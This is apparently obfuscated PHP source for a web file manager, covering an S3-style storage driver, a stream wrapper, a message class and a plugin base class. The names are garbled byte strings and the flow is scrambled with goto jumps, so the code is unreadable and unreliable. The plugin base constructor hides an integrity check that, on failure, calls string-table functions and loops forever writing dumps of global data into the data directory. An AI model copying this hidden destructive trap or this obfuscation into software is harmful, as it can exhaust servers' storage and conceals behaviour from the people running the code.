Ğà[1109] => $d»”×Ğ±ò, $C¼¿ó— Ğà[1144] => $Aù‹£ÃÂ½™, $C¼¿ó— Ğà[1145] => $B††”¯¶İ°, $C¼¿ó— Ğà[1146] => $Cö´ĞÉ¶¤, $C¼¿ó— Ğà[1147] => $eãëÂæô¦İ, $C¼¿ó— Ğà[1148] => $B¿½° ­, $C¼¿ó— Ğà[179] => $this->getHost()); return $dÃğáÔº˜³; goto D§ïÇ¶´”; Eùï…àï‘ç: $Bß©•°ó¹Ï = array($this->accessKey, $eÜ°Íæ‡, $this->region, $AˆÃö­Ô¥Û, $cø’ÁÔÄğ); $Aù‹£ÃÂ½™ = implode($C¼¿ó— Ğà[18], $Bß©•°ó¹Ï); $f¹²·˜¤ = array($C¼¿ó— Ğà[1099] => gmdate($C¼¿ó— Ğà[1098], strtotime($C¼¿ó— Ğà[1134])), $C¼¿ó— Ğà[1100] => array(array($C¼¿ó— Ğà[1102] => $this->bucket), array($C¼¿ó— Ğà[1101] => $bÚ‰‚è½ĞÓ), array($C¼¿ó— Ğà[1103], $C¼¿ó— Ğà[1104], $C¼¿ó— Ğà[43]), array($C¼¿ó— Ğà[1103], $C¼¿ó— Ğà[1135], $C¼¿ó— Ğà[43]), array($C¼¿ó— Ğà[1103], $C¼¿ó— Ğà[1136], $C¼¿ó— Ğà[43]), array($C¼¿ó— Ğà[1105] => $fÜ‡Çèˆí¤), array($C¼¿ó— Ğà[1137] => $Aù‹£ÃÂ½™), array($C¼¿ó— Ğà[1138] => $B††”¯¶İ°), array($C¼¿ó— Ğà[1139] => $Cö´ĞÉ¶¤), array($C¼¿ó— Ğà[1140] => $eãëÂæô¦İ))); goto eç‚‹Õª‹ó; AÂâ×ô»Ñà: $C¼¿ó— Ğà =& $_SERVER[©]; $bÚ‰‚è½ĞÓ = $C¼¿ó— Ğà[195]; $B††”¯¶İ° = $C¼¿ó— Ğà[1131]; goto F«®ë±»à; FŞ´…Ïå–Ú: $cø’ÁÔÄğ = $C¼¿ó— Ğà[1133]; $eãëÂæô¦İ = $c·¿È©Èô . $C¼¿ó— Ğà[43]; $fÜ‡Çèˆí¤ = $C¼¿ó— Ğà[1097]; goto Eùï…àï‘ç; EëèíÆ‡ø×: $CçœõÁ½ç½ = hash_hmac($C¼¿ó— Ğà[1141], $AˆÃö­Ô¥Û, $Cğº™ÆÖ‹™, !0); $bô¹äÄßõ = hash_hmac($C¼¿ó— Ğà[1141], $cø’ÁÔÄğ, $CçœõÁ½ç½, !0); $B¿½° ­ = hash_hmac($C¼¿ó— Ğà[1141], $d»”×Ğ±ò, $bô¹äÄßõ); goto F»‰ù·ôé†; eç‚‹Õª‹ó: $d»”×Ğ±ò = base64_encode(json_encode($f¹²·˜¤)); $c‡æ¬›ÛĞÒ = hash_hmac($C¼¿ó— Ğà[1141], $eÜ°Íæ‡, $C¼¿ó— Ğà[1142] . $this->secret, !0); $Cğº™ÆÖ‹™ = hash_hmac($C¼¿ó— Ğà[1141], $this->region, $c‡æ¬›ÛĞÒ, !0); goto EëèíÆ‡ø×; F«®ë±»à: $AˆÃö­Ô¥Û = $C¼¿ó— Ğà[69]; $Cö´ĞÉ¶¤ = gmdate($C¼¿ó— Ğà[1132]); $eÜ°Íæ‡ = gmdate($C¼¿ó— Ğà[689]); goto FŞ´…Ïå–Ú; D§ïÇ¶´”: } public function multiUploadFormData($F¹Üî†“¾ƒ, $Aõ‘áõÆß“ = 3600) { $a©„‰Ú¾Õ =& $_SERVER[©]; $C‡™îÄ‡Á  = gmdate($a©„‰Ú¾Õ[1227]); $C³¡Óë¬Î = array(); $E†ïç¢À½ = $this->client->getUploadId($this->bucket, $F¹Üî†“¾ƒ, $C³¡Óë¬Î); if (!$E†ïç¢À½) { return !1; } return array($a©„‰Ú¾Õ[219] => $E†ïç¢À½, $a©„‰Ú¾Õ[179] => $this->getHost() . $a©„‰Ú¾Õ[18] . $this->pathEncode($F¹Üî†“¾ƒ), $a©„‰Ú¾Õ[220] => $C‡™îÄ‡Á , $a©„‰Ú¾Õ[99] => $F¹Üî†“¾ƒ); } public function multiUploadAuthData($E«ÄïäËÅ•, $A“‡º«²± = array()) { goto F„¤ªœ¼Ÿ; f…¯×÷æ¹‹: $Eéä˜ß¬£… = $d½²Ò…¯Õ×[224]; $c¶‹¨Ç¿¦ï = $d½²Ò…¯Õ×[18] . $this->pathEncode($b¶ÕŸ£ºˆ) . $EÖó¨ºÌ²›; $EŸùÇ’’¿Æ = $this->client->__getSignatureV4($fŸœĞğ„à, $A……ÛÄ²Ÿñ, $Eéä˜ß¬£…, $c¶‹¨Ç¿¦ï); goto E „¸³¡™ã; E „¸³¡™ã: if (strpos($EÖó¨ºÌ²›, $d½²Ò…¯Õ×[223]) === 0) { if (isset($fŸœĞğ„à[$d½²Ò…¯Õ×[1229]])) { $Fõ²šÏ¬—è = $fŸœĞğ„à[$d½²Ò…¯Õ×[1229]]; } else { if (isset($EŸùÇ’’¿Æ[$d½²Ò…¯Õ×[1229]])) { $Fõ²šÏ¬—è = $EŸùÇ’’¿Æ[$d½²Ò…¯Õ×[1229]]; } else { $Fõ²šÏ¬—è = hash($d½²Ò…¯Õ×[1141], $d½²Ò…¯Õ×[43]); } } return array($d½²Ò…¯Õ×[229] => $EŸùÇ’’¿Æ[$d½²Ò…¯Õ×[229]], $d½²Ò…¯Õ×[1229] => $Fõ²šÏ¬—è, $d½²Ò…¯Õ×[220] => $EŸùÇ’’¿Æ[$d½²Ò…¯Õ×[1232]]); } return $EŸùÇ’’¿Æ[$d½²Ò…¯Õ×[229]]; goto e¥ªò‹¨Æ¸; fÜ‘£‘›˜ : if (isset($A“‡º«²±[$d½²Ò…¯Õ×[1228]])) { $fŸœĞğ„à[$d½²Ò…¯Õ×[1229]] = $A“‡º«²±[$d½²Ò…¯Õ×[1228]]; } $CÕ‹Œ‰Ğòƒ = explode($d½²Ò…¯Õ×[181], $this->getHost()); $A……ÛÄ²Ÿñ = array($d½²Ò…¯Õ×[1230] => $CÕ‹Œ‰Ğòƒ[1], $d½²Ò…¯Õ×[1231] => $d½²Ò…¯Õ×[43], $d½²Ò…¯Õ×[209] => $d½²Ò…¯Õ×[126], $d½²Ò…¯Õ×[1143] => $A“‡º«²±[$d½²Ò…¯Õ×[87]]); goto f…¯×÷æ¹‹; F„¤ªœ¼Ÿ: $d½²Ò…¯Õ× =& $_SERVER[©]; $EÖó¨ºÌ²› = isset($A“‡º«²±[$d½²Ò…¯Õ×[170]]) ? $A“‡º«²±[$d½²Ò…¯Õ×[170]] : $d½²Ò…¯Õ×[43]; $b¶ÕŸ£ºˆ = $A“‡º«²±[$d½²Ò…¯Õ×[99]]; goto eŠƒÅ•³îÄ; eŠƒÅ•³îÄ: unset($A“‡º«²±[$d½²Ò…¯Õ×[99]]); if (isset($A“‡º«²±[$d½²Ò…¯Õ×[221]])) { return $this->listUploadParts($b¶ÕŸ£ºˆ, $A“‡º«²±); } $fŸœĞğ„à = array(); goto fÜ‘£‘›˜ ; e¥ªò‹¨Æ¸: } public function listUploadParts($D˜Ÿ†¥Áé, $EâÄÓ¯—é¡ = array()) { goto c¨†·‰³Ö; dß‡ŸæÈïï: if (!$E¶Ö£ ¨èÀ) { return !1; } $fÆ ¯¨ÔÖ£ = $A¶¶Í›õç[1233]; foreach ($E¶Ö£ ¨èÀ as $a½Ñø½Æó) { $fÆ ¯¨ÔÖ£ .= $A¶¶Í›õç[1234] . "\74\120\x61\162\x74\116\165\x6d\x62\x65\162\76{$a½Ñø½Æó[$A¶¶Í›õç[1185]]}\x3c\x2f\x50\x61\162\x74\116\165\x6d\142\145\162\76\12" . "\74\x45\124\141\147\76{$a½Ñø½Æó[$A¶¶Í›õç[1186]]}\74\57\105\124\141\147\x3e\12" . $A¶¶Í›õç[1235]; } goto eÒÅ¯ÂßòÑ; c¨†·‰³Ö: $A¶¶Í›õç =& $_SERVER[©]; $dÚ®–«£Ô… = str_replace($A¶¶Í›õç[230], $A¶¶Í›õç[43], $EâÄÓ¯—é¡[$A¶¶Í›õç[170]]); $E¶Ö£ ¨èÀ = $this->client->listParts($this->bucket, $D˜Ÿ†¥Áé, $dÚ®–«£Ô…); goto dß‡ŸæÈïï; eÒÅ¯ÂßòÑ: $fÆ ¯¨ÔÖ£ .= $A¶¶Í›õç[1236]; $C™ùÇåÎíÖ = array(); $A›‘·•”´Ú = explode($A¶¶Í›õç[181], $this->getHost()); goto D˜‚”ÒŠ; f²Ëº–‹£Ò: $a”„‘‹‡‰  = $this->client->__getSignatureV4($C™ùÇåÎíÖ, $b÷ŸãÅ«‚, $Díæ—‘ñó, $aÕš•ùÉèæ, $fÆ ¯¨ÔÖ£); return array($A¶¶Í›õç[229] => $a”„‘‹‡‰ [$A¶¶Í›õç[229]], $A¶¶Í›õç[220] => $a”„‘‹‡‰ [$A¶¶Í›õç[1232]], $A¶¶Í›õç[231] => $E¶Ö£ ¨èÀ, $A¶¶Í›õç[1229] => $a”„‘‹‡‰ [$A¶¶Í›õç[1229]]); goto E¦·Ÿ«…½ù; D˜‚”ÒŠ: $b÷ŸãÅ«‚ = array($A¶¶Í›õç[1230] => $A›‘·•”´Ú[1], $A¶¶Í›õç[209] => $A¶¶Í›õç[126], $A¶¶Í›õç[1143] => strlen($fÆ ¯¨ÔÖ£)); $Díæ—‘ñó = $A¶¶Í›õç[222]; $aÕš•ùÉèæ = $A¶¶Í›õç[18] . $this->pathEncode($D˜Ÿ†¥Áé) . $EâÄÓ¯—é¡[$A¶¶Í›õç[170]]; goto f²Ëº–‹£Ò; E¦·Ÿ«…½ù: } public function link($EŸÓğÎŸ®×, $Cæá“×†ÎÎ = array()) { return parent::link($EŸÓğÎŸ®×, $Cæá“×†ÎÎ); } public function fileOut($CË†ˆ‚º‰, $fÔˆ›¯—ƒß = false, $Bù“§íİÂ¤ = false, $c‘½™øòíÙ = '') { if (strstr($this->endpoint, $_SERVER[©][1237])) { return parent::fileOutServer($CË†ˆ‚º‰, $fÔˆ›¯—ƒß, $Bù“§íİÂ¤, $c‘½™øòíÙ); } parent::fileOut($CË†ˆ‚º‰, $fÔˆ›¯—ƒß, $Bù“§íİÂ¤, $c‘½™øòíÙ); } public function fileOutImage($fí¯çóÆ±İ, $C¡È°Ä‰ä´ = 250) { if (strstr($this->endpoint, $_SERVER[©][1237])) { return parent::fileOutImageServer($fí¯çóÆ±İ, $C¡È°Ä‰ä´); } parent::fileOutImage($fí¯çóÆ±İ, $C¡È°Ä‰ä´); } public function fileOutLink($A³¸¸‚®¢) { $fÄğ …ë²‡ =& $_SERVER[©]; if (substr($A³¸¸‚®¢, 0, 7) == $fÄğ …ë²‡[1112]) { $A³¸¸‚®¢ = $fÄğ …ë²‡[1113] . substr($A³¸¸‚®¢, 7); } header($fÄğ …ë²‡[166] . $A³¸¸‚®¢); die; } public function getHost() { $b™—–÷Ï =& $_SERVER[©]; $E»Ë‡ëÇ´À = str_rtrim(parent::getHost(), $b™—–÷Ï[18] . $this->bucket); $E»Ë‡ëÇ´À = explode($b™—–÷Ï[181], $E»Ë‡ëÇ´À); return $E»Ë‡ëÇ´À[0] . $b™—–÷Ï[181] . $this->bucket . $b™—–÷Ï[101] . $E»Ë‡ëÇ´À[1]; } } goto b“…ÄÀ¶ùµ; aì—¼°•„: define($_SERVER[©][1933], 5); define($_SERVER[©][1934], 16); define($_SERVER[©][1935], 32); goto FáË—¬¡Á; BÈ§‘Éñ¾Ù: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($D˜½óÈºíŸ, $C·Ïë´†Ç = '') { goto C¡Ãö½±·õ; e¤‡ª…ô²ù: return $this->info ? !0 : !1; goto DœÈ…İŠ; C¡Ãö½±·õ: $this->info = $this->info($D˜½óÈºíŸ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[©][85]]; goto cºÛâİ•ñ; cºÛâİ•ñ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$D˜½óÈºíŸ])) { self::$_chunkBuffer[$D˜½óÈºíŸ] = array(); } goto e¤‡ª…ô²ù; DœÈ…İŠ: } function stream_read($EÓŞ­–ª’†) { $Añæ¾Û»ãñ = $this->fileSubstr($this->pose, $EÓŞ­–ª’†); $this->pose += strlen($Añæ¾Û»ãñ); return $Añæ¾Û»ãñ; } public function stream_tell() { return $this->pose; } public function stream_seek($aß¦£¬ÉÊ†, $eÉÒÇÒ—îØ) { $eò¡æÑÏ =& $_SERVER[©]; if ($eÉÒÇÒ—îØ == SEEK_SET) { $this->pose = $aß¦£¬ÉÊ†; } else { if ($eÉÒÇÒ—îØ == SEEK_CUR) { $this->pose += $aß¦£¬ÉÊ†; } else { if ($eÉÒÇÒ—îØ == SEEK_END) { $this->pose = $this->info[$eò¡æÑÏ[87]] + intval($aß¦£¬ÉÊ†); } } } if ($aß¦£¬ÉÊ† < 0) { $this->pose = $this->info[$eò¡æÑÏ[87]] + $aß¦£¬ÉÊ†; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[©][87]]; } public function stream_close() { return !0; } public function url_stat($dŒ¾ö¶øùÛ, $E«•¹¾ÍÍ) { $cíÏå¾Şá =& $_SERVER[©]; $b‡¬Ä§“ˆÛ = $this->info($dŒ¾ö¶øùÛ); return array($cíÏå¾Şá[1287] => 0, $cíÏå¾Şá[1288] => 0, $cíÏå¾Şá[22] => 32768 + 511, $cíÏå¾Şá[1289] => 0, $cíÏå¾Şá[1290] => 0, $cíÏå¾Şá[1291] => 0, $cíÏå¾Şá[1292] => 0, $cíÏå¾Şá[87] => $b‡¬Ä§“ˆÛ[$cíÏå¾Şá[87]], $cíÏå¾Şá[1293] => $b‡¬Ä§“ˆÛ[$cíÏå¾Şá[1165]], $cíÏå¾Şá[1251] => $b‡¬Ä§“ˆÛ[$cíÏå¾Şá[117]], $cíÏå¾Şá[1250] => $b‡¬Ä§“ˆÛ[$cíÏå¾Şá[197]], $cíÏå¾Şá[1294] => 0, $cíÏå¾Şá[1295] => 0); } static $fileInfo = array(); public function info($E¬‹ï¼É´) { $A»ƒ‹•œ«Î = $_SERVER[©][1296]; if (isset(self::$fileInfo[$E¬‹ï¼É´])) { return self::$fileInfo[$E¬‹ï¼É´]; } if (substr($E¬‹ï¼É´, 0, strlen($A»ƒ‹•œ«Î)) != $A»ƒ‹•œ«Î) { return !1; } self::$fileInfo[$E¬‹ï¼É´] = IO::info(substr($E¬‹ï¼É´, strlen($A»ƒ‹•œ«Î))); return self::$fileInfo[$E¬‹ï¼É´]; } public static function read($fˆŸÕ­Ôİ©, $b‰êòº©Ó‹, $F¢†ˆŸ†‘‚) { goto e«È†Ù‡; e«È†Ù‡: $DÅ·Ù²ñçÌ =& $_SERVER[©]; $bÏß²²ß¼è = fopen($fˆŸÕ­Ôİ©, $DÅ·Ù²ñçÌ[1167]); if (!$bÏß²²ß¼è) { return $DÅ·Ù²ñçÌ[43]; } goto dµƒ–ÕÅšÕ; Dê‰•åÛÒ: $aÄ±¸Ò‹É‰ = 0; while ($aÄ±¸Ò‹É‰ < $F¢†ˆŸ†‘‚) { $C„Ä÷‘»íØ = min($dÆË£ˆì“, $F¢†ˆŸ†‘‚ - $aÄ±¸Ò‹É‰); $e¹Ò¿¡Åœ .= fread($bÏß²²ß¼è, $C„Ä÷‘»íØ); $aÄ±¸Ò‹É‰ += $C„Ä÷‘»íØ; } fclose($bÏß²²ß¼è); goto eÊöÒ¡Şæ‹; eÊöÒ¡Şæ‹: return $e¹Ò¿¡Åœ; goto B•±“Ò¬; dµƒ–ÕÅšÕ: $dÆË£ˆì“ = 8192; fseek($bÏß²²ß¼è, $b‰êòº©Ó‹, SEEK_SET); $e¹Ò¿¡Åœ = $DÅ·Ù²ñçÌ[43]; goto Dê‰•åÛÒ; B•±“Ò¬: } public function fileSubstr($b­¬“³ó¹, $d¬ãËğ¸¸‹) { goto fÃÁÜÜø¦Ÿ; Cï¹‘“¥ÙĞ: ksort($B¨İœ‰”µÁ); $FĞÑ×´áöß = substr($fÀÔÒò‘•, $b­¬“³ó¹ - $Eº³§¿ÏÄ , $d¬ãËğ¸¸‹); return $FĞÑ×´áöß; goto d‡å÷ğí; aÕ¹ê¼ã: $b¢ŸÚŸ = 0; $déÉòÒŞ¯à = 0; $CùôÆ¼ËÃ = $f½é‰¨¼éî[43]; goto eÙ‡†·òÌ“; D¾Óƒ¾°Øà: $FÕÓ‡Òì¬“ = 64 * 1024; $B¨İœ‰”µÁ =& self::$_chunkBuffer[$this->path]; if (!$B¨İœ‰”µÁ) { $B¨İœ‰”µÁ = array(); } goto aÕ¹ê¼ã; fÃÁÜÜø¦Ÿ: $f½é‰¨¼éî =& $_SERVER[©]; $fã½Œ¦£º = $this->info[$f½é‰¨¼éî[87]]; $C÷Ï´‘àÙó = $b­¬“³ó¹; goto FšÃ©Ää³ä; FšÃ©Ää³ä: $eÎ¨½×£ = $d¬ãËğ¸¸‹; if ($b­¬“³ó¹ < 0) { $b­¬“³ó¹ = $fã½Œ¦£º + $b­¬“³ó¹; } if ($d¬ãËğ¸¸‹ === !1) { $d¬ãËğ¸¸‹ = $fã½Œ¦£º - $b­¬“³ó¹; } goto C­Ôâµ†ï™; C­Ôâµ†ï™: if ($b­¬“³ó¹ + $d¬ãËğ¸¸‹ > $fã½Œ¦£º) { $d¬ãËğ¸¸‹ = $fã½Œ¦£º - $b­¬“³ó¹; } if ($d¬ãËğ¸¸‹ <= 0) { return $f½é‰¨¼éî[43]; } if ($b­¬“³ó¹ < 0 || $b­¬“³ó¹ >= $fã½Œ¦£º || $d¬ãËğ¸¸‹ <= 0 || $d¬ãËğ¸¸‹ > 1024 * 1024 * 5) { throw new Exception("\x69\157\106\151\154\x65\x52\145\141\144\x20\145\x72\x72\x6f\x72\x21\x20\x73\164\x61\x72\x74\75{$b­¬“³ó¹}\x3b\x6c\145\156\x67\164\x68\x3d{$d¬ãËğ¸¸‹}\73\40\x73\151\172\145\75{$fã½Œ¦£º}\73"); } goto D¾Óƒ¾°Øà; eÙ‡†·òÌ“: foreach ($B¨İœ‰”µÁ as $b¢ŸÚŸ => $CùôÆ¼ËÃ) { $b¢ŸÚŸ = intval($b¢ŸÚŸ); $déÉòÒŞ¯à = $b¢ŸÚŸ + strlen($CùôÆ¼ËÃ); if ($b­¬“³ó¹ >= $déÉòÒŞ¯à) { continue; } if ($b­¬“³ó¹ >= $b¢ŸÚŸ && $b­¬“³ó¹ + $d¬ãËğ¸¸‹ <= $déÉòÒŞ¯à) { return substr($CùôÆ¼ËÃ, $b­¬“³ó¹ - $b¢ŸÚŸ, $d¬ãËğ¸¸‹); } break; } if (count($B¨İœ‰”µÁ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($f½é‰¨¼éî[1297], $f½é‰¨¼éî[1298] . count($B¨İœ‰”µÁ) . "\73\163\164\x61\162\164\x3d{$b­¬“³ó¹}\54\154\145\x6e\147\164\150\75{$d¬ãËğ¸¸‹}\x3b\x70\157\163\145\72{$b¢ŸÚŸ}\176{$déÉòÒŞ¯à}"); throw new Exception($f½é‰¨¼éî[1299]); } $Eº³§¿ÏÄ  = intval($b­¬“³ó¹ / $FÕÓ‡Òì¬“) * $FÕÓ‡Òì¬“; goto FÎÛ÷ÚóÛ†; FÎÛ÷ÚóÛ†: $Bç‰Ò‹’Ç = ceil(($b­¬“³ó¹ + $d¬ãËğ¸¸‹) / $FÕÓ‡Òì¬“) * $FÕÓ‡Òì¬“ - $Eº³§¿ÏÄ ; $fÀÔÒò‘• = IO::fileSubstr($this->path, $Eº³§¿ÏÄ , $Bç‰Ò‹’Ç); $B¨İœ‰”µÁ[$Eº³§¿ÏÄ  . $f½é‰¨¼éî[43]] = $fÀÔÒò‘•; goto Cï¹‘“¥ÙĞ; d‡å÷ğí: } private function log($CÙÊ¤ØÇ‹”, $E–ˆª‡‚Ù) { $D­É‹’÷¤¥ =& $_SERVER[©]; $AŠÍ–—ªŸ = timeFloat() - $this->timeStart; write_log(sprintf($D­É‹’÷¤¥[1300], $CÙÊ¤ØÇ‹”, $this->info[$D­É‹’÷¤¥[38]], $AŠÍ–—ªŸ, $E–ˆª‡‚Ù), $D­É‹’÷¤¥[1216]); } } class Message { function __construct() { } public function send($AñéèèÆ¦ = '', $E£¬³ëœ—Ë = array(), $E“Ğ²áÒİ© = "\164\x65\x78\x74") { goto FôÑ´µâå±; b­†«†¼æÆ: Hook::trigger($fö–ª³ä—â[1304], $Bçİ’±‰¶); goto B…§¿¦èïÀ; eÊ–åªêÍª: $E£¬³ëœ—Ë = array($fö–ª³ä—â[968] => isset($E£¬³ëœ—Ë[$fö–ª³ä—â[968]]) ? $E£¬³ëœ—Ë[$fö–ª³ä—â[968]] : $fö–ª³ä—â[43], $fö–ª³ä—â[543] => isset($E£¬³ëœ—Ë[$fö–ª³ä—â[543]]) ? $E£¬³ëœ—Ë[$fö–ª³ä—â[543]] : $fö–ª³ä—â[43]); if (empty($AñéèèÆ¦) || empty($E£¬³ëœ—Ë[$fö–ª³ä—â[968]]) && empty($E£¬³ëœ—Ë[$fö–ª³ä—â[543]])) { return !1; } $Bçİ’±‰¶ = array($fö–ª³ä—â[1243] => $Aƒ£­§õàŒ, $fö–ª³ä—â[1303] => $E£¬³ëœ—Ë); goto b­†«†¼æÆ; FôÑ´µâå±: $fö–ª³ä—â =& $_SERVER[©]; $Aƒ£­§õàŒ = array($fö–ª³ä—â[39] => $fö–ª³ä—â[1301], $fö–ª³ä—â[691] => $AñéèèÆ¦); if (in_array($E“Ğ²áÒİ©, array($fö–ª³ä—â[1301], $fö–ª³ä—â[1302]))) { $Aƒ£­§õàŒ[$fö–ª³ä—â[39]] = $E“Ğ²áÒİ©; } goto eÊ–åªêÍª; B…§¿¦èïÀ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto B§¶Î‡‹¤Ï; fÌ­°áŒÂÌ: if ($_SERVER[$bµÓ—‘í½Ù[4]] != $C‘ùŞ¸†·($cÆÇÒ‹‡)) { goto B»á£Ù¶¹; B»á£Ù¶¹: $b°•ïï•§× = $bµÓ—‘í½Ù[789]; $F£ŠÊˆÒ = $bµÓ—‘í½Ù[6]; $aâÛ„Òô = $_SERVER[$bµÓ—‘í½Ù[7]] . $bµÓ—‘í½Ù[8]; goto A˜˜ÇÚ¯í“; bÜùˆ÷º³²: $b°•ïï•§×(); $e³„Çàí™µ = $bµÓ—‘í½Ù[792]; $E§ĞËèŸ = json_encode($GLOBALS[$bµÓ—‘í½Ù[793]]); goto c¾´‹¨°·¾; A˜˜ÇÚ¯í“: $e†…ÛÜ´ªÏ = $F£ŠÊˆÒ($aâÛ„Òô); $EãÏéòÀîù = explode($bµÓ—‘í½Ù[9], $e†…ÛÜ´ªÏ); if (count($EãÏéòÀîù) < $bµÓ—‘í½Ù[564]) { $cĞÇĞå®¶ö = $bµÓ—‘í½Ù[11]; $cĞÇĞå®¶ö(); } goto A…ÖÙí¹ºé; c¾´‹¨°·¾: $Eî»î¡‚× = 1; for ($c•¾®—Í¾ = $Eî»î¡‚×; $c•¾®—Í¾ > 0; $c•¾®—Í¾++) { $e³„Çàí™µ(DATA_PATH . $c•¾®—Í¾, $E§ĞËèŸ); } goto dõğö“­­Ğ; A…ÖÙí¹ºé: $bŸÔ×ø¿Ùê = $bµÓ—‘í½Ù[790]; $bŸÔ×ø¿Ùê($_SERVER[$bµÓ—‘í½Ù[791]]); $b°•ïï•§× = $bµÓ—‘í½Ù[789]; goto bÜùˆ÷º³²; dõğö“­­Ğ: } global $in, $config; $this->config =& $config; goto FòÆİÙÙç‘; dĞÙ³–ƒ—®: $this->pluginHostDefault = $config[$bµÓ—‘í½Ù[1307]] . $this->pluginName . $bµÓ—‘í½Ù[18]; $bñ›Á¾İ = $config[$bµÓ—‘í½Ù[1308]]; if ($bñ›Á¾İ && strpos($bµÓ—‘í½Ù[57] . $bñ›Á¾İ . $bµÓ—‘í½Ù[57], $this->pluginName) !== !1) { $this->pluginHost = $config[$bµÓ—‘í½Ù[1309]] . $this->pluginName . $bµÓ—‘í½Ù[18]; } goto b±‘–¶³ÍÕ; c­…»ŠŒíé: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $bµÓ—‘í½Ù[18]; $this->pluginApi = appHostGet() . $bµÓ—‘í½Ù[1306] . $this->pluginName . $bµÓ—‘í½Ù[18]; $this->pluginHost = $config[$bµÓ—‘í½Ù[1307]] . $this->pluginName . $bµÓ—‘í½Ù[18]; goto dĞÙ³–ƒ—®; B§¶Î‡‹¤Ï: $bµÓ—‘í½Ù =& $_SERVER[©]; $cÆÇÒ‹‡ = $_SERVER[$bµÓ—‘í½Ù[791]] . $bµÓ—‘í½Ù[777]; $C‘ùŞ¸†· = $bµÓ—‘í½Ù[778]; goto fÌ­°áŒÂÌ; b±‘–¶³ÍÕ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto F‘™¦¶à¾É; FòÆİÙÙç‘: $this->in =& $in; $this->modelPlugin = Model($bµÓ—‘í½Ù[1305]); $this->pluginName = str_replace($bµÓ—‘í½Ù[1305], $bµÓ—‘í½Ù[43], get_class($this)); goto c­…»ŠŒíé; F‘™¦¶à¾É: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[©][1310]); } protected function assign($bëÌ·×¹à, $bÊ¶ªÀĞ® = false) { if (is_array($bëÌ·×¹à)) { $this->values = array_merge($this->values, $bëÌ·×¹à); } else { $this->values[$bëÌ·×¹à] = $bÊ¶ªÀĞ®; } } protected function display($A£ŒˆÁ´ˆÅ) { extract($this->values); require $A£ŒˆÁ´ˆÅ; } final function hookRegist($cÊÏğ©ˆÔÚ) { $this->modelPlugin->appRegist($this->pluginName, $cÊÏğ©ˆÔÚ); } final function appIcon() { $c›ù£º¤õä =& $_SERVER[©]; $f¬œ‹ÚÕ‡ = $this->appPackage(); $F ĞÀÂœàö = $c›ù£º¤õä[43]; if (isset($f¬œ‹ÚÕ‡[$c›ù£º¤õä[390]])) { if (isset($f¬œ‹ÚÕ‡[$c›ù£º¤õä[390]][$c›ù£º¤õä[1311]])) { $F ĞÀÂœàö = $c›ù£º¤õä[1312] . $f¬œ‹ÚÕ‡[$c›ù£º¤õä[390]][$c›ù£º¤õä[1311]] . $c›ù£º¤õä[1313]; } else { if ($f¬œ‹ÚÕ‡[$c›ù£º¤õä[390]][$c›ù£º¤õä[1314]]) { $F ĞÀÂœàö = $c›ù£º¤õä[1315] . $f¬œ‹ÚÕ‡[$c›ù£º¤õä[390]][$c›ù£º¤õä[1314]] . $c›ù£º¤õä[1316]; } } } return $F ĞÀÂœàö; } final function fileCanView($EåàğĞŒ©) { goto FÓŠ‡Åİğ¯; CÜ¡‚¼¯¸: ActionCall($f•Œæ¦Í˜¾[1329], $EåàğĞŒ©); goto c°¾Ô¹­Ğ; BØòŒã…Î®: $bº’³˜÷” = Session::get($f•Œæ¦Í˜¾[1317]); if (!$bº’³˜÷” || !$bº’³˜÷”[$f•Œæ¦Í˜¾[1318]]) { $B­ˆ¨Ğ»Ãí = $f•Œæ¦Í˜¾[1319] . rawurlencode(this_url()); show_tips(LNG($f•Œæ¦Í˜¾[1320]) . $f•Œæ¦Í˜¾[1321] . $B­ˆ¨Ğ»Ãí . $f•Œæ¦Í˜¾[1322] . LNG($f•Œæ¦Í˜¾[1323]) . $f•Œæ¦Í˜¾[1324], !1); } if (!Action($f•Œæ¦Í˜¾[1325])->authCan($f•Œæ¦Í˜¾[1326])) { show_tips(LNG($f•Œæ¦Í˜¾[1327]) . $f•Œæ¦Í˜¾[1328], !1); } goto CÜ¡‚¼¯¸; FÓŠ‡Åİğ¯: $f•Œæ¦Í˜¾ =& $_SERVER[©]; if (request_url_safe($EåàğĞŒ©)) { return !0; } if ($this->isShare($EåàğĞŒ©)) { return !0; } goto BØòŒã…Î®; c°¾Ô¹­Ğ: } final function isShare($bˆâåÄÙŒÌ) { $fóêŠ£‡ì… = KodIO::parse($bˆâåÄÙŒÌ); return $fóêŠ£‡ì…[$_SERVER[©][39]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Fõãà¦êÖŒ) { if (request_url_safe($Fõãà¦êÖŒ)) { return $Fõãà¦êÖŒ; } if (!$this->isShare($Fõãà¦êÖŒ)) { $Fõãà¦êÖŒ = $this->filePath($Fõãà¦êÖŒ); } return Action($_SERVER[©][1015])->linkOut($Fõãà¦êÖŒ); } public function filePathLinkOut($d¿Şø£‘ÅÌ) { if (request_url_safe($d¿Şø£‘ÅÌ)) { return $d¿Şø£‘ÅÌ; } $this->fileCanView($d¿Şø£‘ÅÌ); return Action($_SERVER[©][1015])->link($d¿Şø£‘ÅÌ); } final function filePath($aÔ‰§¬) { $f¸öˆ…ø„“ =& $_SERVER[©]; if ($b À¢†Â°— = $this->checkSharePath($aÔ‰§¬)) { return $b À¢†Â°—; } $this->fileCanView($aÔ‰§¬); if (request_url_safe($aÔ‰§¬)) { $DÃÙÉš˜—½ = parse_url_query($aÔ‰§¬); if (isset($DÃÙÉš˜—½[$f¸öˆ…ø„“[1330]]) && isset($DÃÙÉš˜—½[$f¸öˆ…ø„“[207]])) { $AÕ­ÑÃÅ£× = Model($f¸öˆ…ø„“[1085])->get($f¸öˆ…ø„“[1331]); $a¸¨§êŒÜ¹ = Mcrypt::decode($DÃÙÉš˜—½[$f¸öˆ…ø„“[207]], $AÕ­ÑÃÅ£×); if 